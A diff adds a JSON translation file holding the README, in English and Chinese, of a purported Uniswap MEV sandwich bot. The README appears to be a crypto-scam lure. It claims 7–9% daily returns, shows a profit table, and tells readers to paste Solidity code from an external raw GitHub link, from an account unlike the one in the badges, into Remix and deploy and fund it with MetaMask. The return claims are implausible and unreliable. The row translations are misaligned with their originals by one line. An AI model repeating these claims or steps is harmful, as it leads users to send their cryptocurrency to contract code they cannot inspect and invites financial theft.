@@ -1,0 +1,946 @@
+[
+  {
+    "Id": 1,
+    "Content": "\n# 🥪 Ethereum Uniswap MEV. Sandwich Bot (DeFi)\n![Bot Controls](https://imgur.com/Z5aVSek.png)\n\n<div align=\"center\">\n<i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>\n</div>\n\n<div align=\"center\">\n  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">\n    <img src=\"https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub stars\" />\n  </a>\n  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">\n    <img src=\"https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub forks\" />\n  </a>\n  <a href=\"https://github.com/ntkme/github-buttons/workflows/build\">\n    <img src=\"https://github.com/ntkme/github-buttons/workflows/build/badge.svg\" alt=\"build\" />\n  </a>\n</div>\n\n<div align=\"center\">\n  <img src=\"https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white\" alt=\"Ethereum\" />\n  <img src=\"https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white\" alt=\"Solidity\" />\n</div>\n\n## 📊 Current Performance\n\n- **Avg. Daily Return**: 7–9% on deployed capital (varies with market volatility).\n- **Minimum Capital Requirement**: 0.5 ETH (under current gas and liquidity conditions).\n- **Note**: Profitability depends on network congestion, competition, and pool liquidity.\n- **Disclaimer**: No guarantees. Past performance does not predict future results.\n\n---\n\n## 📈 Latest Profitable Transactions\n\n**Last Updated**: 2025-04-19\n\nBelow are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.\n\n| Tx Hash                                                                 | Block    | Profit (ETH) | Timestamp           |\n|-------------------------------------------------------------------------|----------|--------------|---------------------|\n| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |\n| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |\n| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |\n| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |\n| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |\n\n---\n\n## 📚 How This Bot Works\n\nThis bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:\n\n1. Buys the target asset before the large swap.\n2. Waits for the target swap to shift the asset’s price.\n3. Sells the asset at the optimized price.\n\nThe bot can perform multiple transactions if necessary to capture an opportunity.\n\n---\n\n## ✨ Features\n\n- Automatically monitors the Ethereum mempool and executes MEV strategies.\n- Dynamic gas pricing to remain competitive.\n- Built-in reverts for failed transactions and profit thresholds to filter unprofitable trades.\n- Open-source and modular codebase for tweaking strategies (e.g., profit thresholds, gas multipliers, etc.).\n\n---\n\n## ⚡ How to Run the Bot\n\n### 1. Install a Wallet\nDownload and set up [MetaMask](https://metamask.io/download.html) or any other EVM-compatible wallet.\n\n### 2. Open Remix\nAccess [Remix - Ethereum IDE](https://remix.ethereum.org), a web-based environment for writing, compiling, and deploying Ethereum smart contracts.\n\n### 3. Create a New File\n📁 Create a new file in Remix and name it, e.g., `bot.sol`.\n\n![Create New File](https://i.imgur.com/1XiPUes.png)\n\n### 4. Paste the Code\n📋 Copy the [bot code](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol) from GitHub and paste it into your newly created Remix file.\n\n### 5. Compile the Contract\n🔧 Go to the `Solidity Compiler` tab, select version `0.6.6+commit`, and click `Compile bot.sol`.\n\n![Compile Contract](https://i.imgur.com/s5OAv6g.png)\n\n### 6. Deploy the Bot\n🚀 Navigate to the `Deploy & Run Transactions` tab, select the `Injected Provider - MetaMask` environment, and click `Deploy`. Approve the MetaMask contract creation fee to deploy your MEV bot.\n\n![Deploy Contract](https://i.imgur.com/2odZQNj.png)\n\n---\n\n## ⚙️ Configuration",
+    "ContentSha": "aGpWN3nVR78nvFRzV0y0L2v9AeOlswmCQ4HeVPEpc9U=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "# 🥪 以太坊 Uniswap MEV。夹心交易机器人 (DeFi)\n![机器人控制](https://imgur.com/Z5aVSek.png)\n\n<div align=\"center\">\n<i>一个开源套利机器人，旨在利用 Uniswap 流动性池中的市场低效。<br>为希望探索以太坊 MEV（最大可提取价值）交易策略的 DeFi 爱好者打造。</i>\n</div>\n\n<div align=\"center\">\n  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">\n    <img src=\"https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub 星标\" />\n  </a>\n  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">\n    <img src=\"https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub 分叉\" />\n  </a>\n  <a href=\"https://github.com/ntkme/github-buttons/workflows/build\">\n    <img src=\"https://github.com/ntkme/github-buttons/workflows/build/badge.svg\" alt=\"构建\" />\n  </a>\n</div>\n\n<div align=\"center\">\n  <img src=\"https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white\" alt=\"Ethereum\" />\n  <img src=\"https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white\" alt=\"Solidity\" />\n</div>\n\n## 📊 当前表现\n\n- **平均日回报**：部署资本每日7–9%（随市场波动而变）。\n- **最低资本需求**：0.5 ETH（基于当前的Gas费和流动性状况）。\n- **注意**：盈利能力取决于网络拥堵、竞争状况和池中流动性。\n- **免责声明**：无任何保证。过往表现不代表未来结果。\n\n---\n\n## 📈 最新盈利交易\n\n**最后更新**：2025-04-19\n\n以下是我们的实时[MEV夹心机器人](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000)执行的最新盈利交易，展示ETH的实时利润。\n\n| 交易哈希                                                                 | 区块     | 利润 (ETH)  | 时间戳              |\n|-------------------------------------------------------------------------|----------|--------------|---------------------|\n| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |\n| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |\n| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |\n| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |\n| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |\n\n---\n\n## 📚 机器人工作原理\n\n本机器人监控以太坊内存池中的待处理交易，寻找 Uniswap 上的大额兑换。当检测到**高滑点交易**时，执行**三步策略**：\n\n1. 在大额兑换前买入目标资产。\n2. 等待目标兑换推动资产价格变动。\n3. 在最优价格卖出资产。\n\n如果需要，机器人可执行多笔交易以捕捉机会。\n\n---\n\n## ✨ 功能特点\n\n- 自动监控以太坊内存池并执行 MEV 策略。\n- 动态调整Gas费以保持竞争力。\n- 内置失败交易回滚及利润阈值过滤无利可图的交易。\n- 开源模块化代码库，方便调整策略（如利润阈值、Gas乘数等）。\n\n---\n\n## ⚡ 如何运行机器人\n\n### 1. 安装钱包\n下载并设置 [MetaMask](https://metamask.io/download.html) 或任何其他兼容 EVM 的钱包。\n\n### 2. 打开 Remix\n访问 [Remix - 以太坊 IDE](https://remix.ethereum.org)，这是一个基于网页的以太坊智能合约编写、编译和部署环境。\n\n### 3. 创建新文件\n📁 在 Remix 中创建一个新文件，命名例如 `bot.sol`。\n\n![创建新文件](https://i.imgur.com/1XiPUes.png)\n\n### 4. 粘贴代码\n📋 从 GitHub 复制[机器人代码](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol)，粘贴到新建的 Remix 文件中。\n\n### 5. 编译合约\n🔧 切换至 `Solidity Compiler` 标签，选择版本 `0.6.6+commit`，点击 `Compile bot.sol`。\n\n![编译合约](https://i.imgur.com/s5OAv6g.png)\n\n### 6. 部署机器人\n🚀 进入 `Deploy & Run Transactions` 标签，选择 `Injected Provider - MetaMask` 环境，点击 `Deploy`。批准 MetaMask 合约部署费用以部署你的 MEV 机器人。\n\n![部署合约](https://i.imgur.com/2odZQNj.png)\n\n---\n\n## ⚙️ 配置\n",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "# 🥪 以太坊 Uniswap MEV。夹心交易机器人 (DeFi)"
+      },
+      {
+        "row": 2,
+        "rowsha": "XCh7qgHPUe3S0XraOQUKhGmBfNMVVNpmTWBxwc/fZb4=",
+        "originContent": "# 🥪 Ethereum Uniswap MEV. Sandwich Bot (DeFi)",
+        "translatedContent": "![机器人控制](https://imgur.com/Z5aVSek.png)"
+      },
+      {
+        "row": 3,
+        "rowsha": "Ibrp2tBmO6rY2h8NvnW9bNdpCzMupzPpLdd8FX5POq0=",
+        "originContent": "![Bot Controls](https://imgur.com/Z5aVSek.png)",
+        "translatedContent": ""
+      },
+      {
+        "row": 4,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "<div align=\"center\">"
+      },
+      {
+        "row": 5,
+        "rowsha": "94MDjHJY1ZLwHNTLIEUIfk7TMc9cq1L/1FmwhqBTe/k=",
+        "originContent": "<div align=\"center\">",
+        "translatedContent": "<i>一个开源套利机器人，旨在利用 Uniswap 流动性池中的市场低效。<br>为希望探索以太坊 MEV（最大可提取价值）交易策略的 DeFi 爱好者打造。</i>"
+      },
+      {
+        "row": 6,
+        "rowsha": "/eqzykWb94N+0P89/ElQerKXYuzYjeMgcMn7al4GqtE=",
+        "originContent": "<i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>",
+        "translatedContent": "</div>"
+      },
+      {
+        "row": 7,
+        "rowsha": "qsMmUbEPVnxGG5tPJV1vsfpoWbU2jYvZpRr5IKshzyM=",
+        "originContent": "</div>",
+        "translatedContent": ""
+      },
+      {
+        "row": 8,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "<div align=\"center\">"
+      },
+      {
+        "row": 9,
+        "rowsha": "94MDjHJY1ZLwHNTLIEUIfk7TMc9cq1L/1FmwhqBTe/k=",
+        "originContent": "<div align=\"center\">",
+        "translatedContent": "  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">"
+      },
+      {
+        "row": 10,
+        "rowsha": "+BprsyjVI9ZF9RR9qVy2wiOJk/9gOC5RkU0b1Ci8sGg=",
+        "originContent": "  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">",
+        "translatedContent": "    <img src=\"https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub 星标\" />"
+      },
+      {
+        "row": 11,
+        "rowsha": "A3EeX6azZ1P/GgXF/EVy4IQ60pvxr0bTh3fYVD/4IzA=",
+        "originContent": "    <img src=\"https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub stars\" />",
+        "translatedContent": "  </a>"
+      },
+      {
+        "row": 12,
+        "rowsha": "7Sl5c7caJ7+Yt222Hl2I2PLtk1UIeh8Qfn02MNONw0Y=",
+        "originContent": "  </a>",
+        "translatedContent": "  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">"
+      },
+      {
+        "row": 13,
+        "rowsha": "+BprsyjVI9ZF9RR9qVy2wiOJk/9gOC5RkU0b1Ci8sGg=",
+        "originContent": "  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">",
+        "translatedContent": "    <img src=\"https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub 分叉\" />"
+      },
+      {
+        "row": 14,
+        "rowsha": "XV6RNMy4XzG/D1pHp08FLqAqFreoGEfB2gs3GARfY4g=",
+        "originContent": "    <img src=\"https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub forks\" />",
+        "translatedContent": "  </a>"
+      },
+      {
+        "row": 15,
+        "rowsha": "7Sl5c7caJ7+Yt222Hl2I2PLtk1UIeh8Qfn02MNONw0Y=",
+        "originContent": "  </a>",
+        "translatedContent": "  <a href=\"https://github.com/ntkme/github-buttons/workflows/build\">"
+      },
+      {
+        "row": 16,
+        "rowsha": "ccckhDERpIU31HYuc2ySzVWVRwzVfXEjTJeWyRaUByg=",
+        "originContent": "  <a href=\"https://github.com/ntkme/github-buttons/workflows/build\">",
+        "translatedContent": "    <img src=\"https://github.com/ntkme/github-buttons/workflows/build/badge.svg\" alt=\"构建\" />"
+      },
+      {
+        "row": 17,
+        "rowsha": "CQYvMRyePlkO6YK7/i/Kv4JyTCTuZzIbPNJygh/c/Cg=",
+        "originContent": "    <img src=\"https://github.com/ntkme/github-buttons/workflows/build/badge.svg\" alt=\"build\" />",
+        "translatedContent": "  </a>"
+      },
+      {
+        "row": 18,
+        "rowsha": "7Sl5c7caJ7+Yt222Hl2I2PLtk1UIeh8Qfn02MNONw0Y=",
+        "originContent": "  </a>",
+        "translatedContent": "</div>"
+      },
+      {
+        "row": 19,
+        "rowsha": "qsMmUbEPVnxGG5tPJV1vsfpoWbU2jYvZpRr5IKshzyM=",
+        "originContent": "</div>",
+        "translatedContent": ""
+      },
+      {
+        "row": 20,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "<div align=\"center\">"
+      },
+      {
+        "row": 21,
+        "rowsha": "94MDjHJY1ZLwHNTLIEUIfk7TMc9cq1L/1FmwhqBTe/k=",
+        "originContent": "<div align=\"center\">",
+        "translatedContent": "  <img src=\"https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white\" alt=\"Ethereum\" />"
+      },
+      {
+        "row": 22,
+        "rowsha": "eVdvah7br0kzi+t4GDIqOsUxu8PqS/o4W7q2N/5kH9o=",
+        "originContent": "  <img src=\"https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white\" alt=\"Ethereum\" />",
+        "translatedContent": "  <img src=\"https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white\" alt=\"Solidity\" />"
+      },
+      {
+        "row": 23,
+        "rowsha": "mKZKfF4mpN5R6Jc1FFSXrFy3qjwE744UBfUxDNc5obo=",
+        "originContent": "  <img src=\"https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white\" alt=\"Solidity\" />",
+        "translatedContent": "</div>"
+      },
+      {
+        "row": 24,
+        "rowsha": "qsMmUbEPVnxGG5tPJV1vsfpoWbU2jYvZpRr5IKshzyM=",
+        "originContent": "</div>",
+        "translatedContent": ""
+      },
+      {
+        "row": 25,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## 📊 当前表现"
+      },
+      {
+        "row": 26,
+        "rowsha": "ICWvGsuSwdWcBKmdKpIkFQxpRuPVnZRuFtztzUEyDJk=",
+        "originContent": "## 📊 Current Performance",
+        "translatedContent": ""
+      },
+      {
+        "row": 27,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "- **平均日回报**：部署资本每日7–9%（随市场波动而变）。"
+      },
+      {
+        "row": 28,
+        "rowsha": "cWH/xfga/ngfwkqyC7fQm8ReZrrroFMm5p+B4KUrOEE=",
+        "originContent": "- **Avg. Daily Return**: 7–9% on deployed capital (varies with market volatility).",
+        "translatedContent": "- **最低资本需求**：0.5 ETH（基于当前的Gas费和流动性状况）。"
+      },
+      {
+        "row": 29,
+        "rowsha": "5d+JkmPUYfAni8jyw3ybycsXue67b7Pcs5V9QLmYyIo=",
+        "originContent": "- **Minimum Capital Requirement**: 0.5 ETH (under current gas and liquidity conditions).",
+        "translatedContent": "- **注意**：盈利能力取决于网络拥堵、竞争状况和池中流动性。"
+      },
+      {
+        "row": 30,
+        "rowsha": "RRJVTpNrby+CfBDIr55LwxDZWcYNtPSAbg4eplKfX/E=",
+        "originContent": "- **Note**: Profitability depends on network congestion, competition, and pool liquidity.",
+        "translatedContent": "- **免责声明**：无任何保证。过往表现不代表未来结果。"
+      },
+      {
+        "row": 31,
+        "rowsha": "FrLILTIq+TpeUISuLb4Sgi5RxSpkjiY4TEmSm0KEhHI=",
+        "originContent": "- **Disclaimer**: No guarantees. Past performance does not predict future results.",
+        "translatedContent": ""
+      },
+      {
+        "row": 32,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---"
+      },
+      {
+        "row": 33,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 34,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## 📈 最新盈利交易"
+      },
+      {
+        "row": 35,
+        "rowsha": "61wMug++q0sQ5Reie/7VfiaAhl9cyDKCg8cP8vjm2og=",
+        "originContent": "## 📈 Latest Profitable Transactions",
+        "translatedContent": ""
+      },
+      {
+        "row": 36,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "**最后更新**：2025-04-19"
+      },
+      {
+        "row": 37,
+        "rowsha": "IeXZBHDGGQi8L53ZF+dtUkDDRcPHgm4jhBO2mD84Mqs=",
+        "originContent": "**Last Updated**: 2025-04-19",
+        "translatedContent": ""
+      },
+      {
+        "row": 38,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "以下是我们的实时[MEV夹心机器人](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000)执行的最新盈利交易，展示ETH的实时利润。"
+      },
+      {
+        "row": 39,
+        "rowsha": "+jHB1YQDpH5Q+oIR6hTsWYM74QbZ5XsJOhX9gQPvHsU=",
+        "originContent": "Below are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.",
+        "translatedContent": ""
+      },
+      {
+        "row": 40,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "| 交易哈希                                                                 | 区块     | 利润 (ETH)  | 时间戳              |"
+      },
+      {
+        "row": 41,
+        "rowsha": "tMNH09D0O+20Hy4bRKQonVTbDOMdfJ1XWvvdF1Hzus0=",
+        "originContent": "| Tx Hash                                                                 | Block    | Profit (ETH) | Timestamp           |",
+        "translatedContent": "|-------------------------------------------------------------------------|----------|--------------|---------------------|"
+      },
+      {
+        "row": 42,
+        "rowsha": "eL+iy0KY+IX5NHYOSeqNiCHC4aPSwJm7rGRy7osPHNw=",
+        "originContent": "|-------------------------------------------------------------------------|----------|--------------|---------------------|",
+        "translatedContent": "| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |"
+      },
+      {
+        "row": 43,
+        "rowsha": "A7ZHyaHS1QwG+U/Rv3ORxpApPTLVQHmEr6MmyXpD1tI=",
+        "originContent": "| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |",
+        "translatedContent": "| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |"
+      },
+      {
+        "row": 44,
+        "rowsha": "Coelp4B77OjNgqXGaRTqPqWnwPMsi6MrXyiE6FR941g=",
+        "originContent": "| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |",
+        "translatedContent": "| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |"
+      },
+      {
+        "row": 45,
+        "rowsha": "6mg2OvqVa4jJJ5Sg/vWUymperrjWNFDDj50C4eu8nMU=",
+        "originContent": "| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |",
+        "translatedContent": "| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |"
+      },
+      {
+        "row": 46,
+        "rowsha": "RwcIlQ+fwuYz09bvlIHWpLwFRcb1Q4qrFhFaKTa+Ezc=",
+        "originContent": "| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |",
+        "translatedContent": "| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |"
+      },
+      {
+        "row": 47,
+        "rowsha": "KEfRuPuFWLePr0RBhLch1111r6u/wnMWtlX3hzhuKEQ=",
+        "originContent": "| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |",
+        "translatedContent": ""
+      },
+      {
+        "row": 48,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---"
+      },
+      {
+        "row": 49,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 50,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## 📚 机器人工作原理"
+      },
+      {
+        "row": 51,
+        "rowsha": "lbcZK3VSvu3ZeqrfOhtG9U14gWzDGqV2sn/Hk/RZwn8=",
+        "originContent": "## 📚 How This Bot Works",
+        "translatedContent": ""
+      },
+      {
+        "row": 52,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "本机器人监控以太坊内存池中的待处理交易，寻找 Uniswap 上的大额兑换。当检测到**高滑点交易**时，执行**三步策略**："
+      },
+      {
+        "row": 53,
+        "rowsha": "fY2nw0iKyWCFDksvPpORZhCW5b0LGImTGey/ATObzmg=",
+        "originContent": "This bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:",
+        "translatedContent": ""
+      },
+      {
+        "row": 54,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "1. 在大额兑换前买入目标资产。"
+      },
+      {
+        "row": 55,
+        "rowsha": "Vk/Koq5xX8NEKv5M9ky+s/kCEX8s3jli1NjiWl0sDo8=",
+        "originContent": "1. Buys the target asset before the large swap.",
+        "translatedContent": "2. 等待目标兑换推动资产价格变动。"
+      },
+      {
+        "row": 56,
+        "rowsha": "HnT73qozUsHInmBMThAgKjEnHILg1M7MTSULTVsggDE=",
+        "originContent": "2. Waits for the target swap to shift the asset’s price.",
+        "translatedContent": "3. 在最优价格卖出资产。"
+      },
+      {
+        "row": 57,
+        "rowsha": "B0L8cVEvTHVEDlmPL/KjcthrYOwh2E+OVqnbKbmvgUM=",
+        "originContent": "3. Sells the asset at the optimized price.",
+        "translatedContent": ""
+      },
+      {
+        "row": 58,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "如果需要，机器人可执行多笔交易以捕捉机会。"
+      },
+      {
+        "row": 59,
+        "rowsha": "lHr415H0dSxlCK/rQTEatiq2ABBLnCq9TPSOK5bK64o=",
+        "originContent": "The bot can perform multiple transactions if necessary to capture an opportunity.",
+        "translatedContent": ""
+      },
+      {
+        "row": 60,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---"
+      },
+      {
+        "row": 61,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 62,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## ✨ 功能特点"
+      },
+      {
+        "row": 63,
+        "rowsha": "VzDxHMl0vKby6BK5RJlfHxPFit1vMlpPiL5Nfi50CNE=",
+        "originContent": "## ✨ Features",
+        "translatedContent": ""
+      },
+      {
+        "row": 64,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "- 自动监控以太坊内存池并执行 MEV 策略。"
+      },
+      {
+        "row": 65,
+        "rowsha": "lqClb23ZM5VRKqAz1kZBfgj1dMfEp0P4fp/tLi3YmbY=",
+        "originContent": "- Automatically monitors the Ethereum mempool and executes MEV strategies.",
+        "translatedContent": "- 动态调整Gas费以保持竞争力。"
+      },
+      {
+        "row": 66,
+        "rowsha": "TS80Se2B7AbGhcAKHPLR5iqS7TqHmxojVKMN+vwuCY8=",
+        "originContent": "- Dynamic gas pricing to remain competitive.",
+        "translatedContent": "- 内置失败交易回滚及利润阈值过滤无利可图的交易。"
+      },
+      {
+        "row": 67,
+        "rowsha": "OdyRwrqmJT21Hk7s9mVf0jH7vtfiovLSR27I4c8TR6s=",
+        "originContent": "- Built-in reverts for failed transactions and profit thresholds to filter unprofitable trades.",
+        "translatedContent": "- 开源模块化代码库，方便调整策略（如利润阈值、Gas乘数等）。"
+      },
+      {
+        "row": 68,
+        "rowsha": "9rok3uzeAWbgbFoMXzXwMW3fUcP6zBPCUm1zhmiT21o=",
+        "originContent": "- Open-source and modular codebase for tweaking strategies (e.g., profit thresholds, gas multipliers, etc.).",
+        "translatedContent": ""
+      },
+      {
+        "row": 69,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---"
+      },
+      {
+        "row": 70,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 71,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## ⚡ 如何运行机器人"
+      },
+      {
+        "row": 72,
+        "rowsha": "ftIPDivWJdV6RTBUdZhavi5Qd6+R+V711l1Y1USBMLA=",
+        "originContent": "## ⚡ How to Run the Bot",
+        "translatedContent": ""
+      },
+      {
+        "row": 73,
